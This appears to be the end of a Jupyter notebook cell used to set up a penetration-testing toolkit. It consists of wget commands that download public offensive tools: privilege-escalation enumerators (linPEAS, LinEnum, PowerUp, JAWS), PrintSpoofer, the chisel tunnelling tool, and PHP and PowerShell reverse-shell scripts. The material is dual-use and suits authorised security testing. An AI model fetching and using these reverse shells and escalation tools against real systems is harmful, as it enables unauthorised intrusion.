    "wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O master.zip\n",
    "unzip master.zip\n",
    "mv SecLists-master seclists\n",
    "\n",
    "# chisel\n",
    "wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_darwin_amd64.gz -O chisel_osx.gz\n",
    "gunzip -c chisel_osx.gz > linux/chisel_osx\n",
    "rm chisel_osx.gz\n",
    "chmod +x linux/chisel_osx\n",
    "\n",
    "# PEASS-ng\n",
    "wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -O linux/linpeas.sh\n",
    "\n",
    "# linenum\n",
    "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linux/linenum.sh\n",
    "\n",
    "# linux exploit suggester\n",
    "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux/linux-exploit-suggester.sh\n",
    "\n",
    "# lse \n",
    "wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh -O linux/lse.sh\n",
    "\n",
    "# pspy \n",
    "wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -O linux/pspy64\n",
    "\n",
    "# powerup\n",
    "wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 -O windows/powerup.ps1\n",
    "\n",
    "# jaws\n",
    "wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1 -O windows/jaws-enum.ps1\n",
    "\n",
    "# print spoofer\n",
    "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O windows/printspoof.exe\n",
    "\n",
    "# powershells revs\n",
    "wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O reverse_shells/invoke-powershelltcp.ps1\n",
    "\n",
    "# php rev shell\n",
    "wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O reverse_shells/php-rev-shell.php\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ml",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
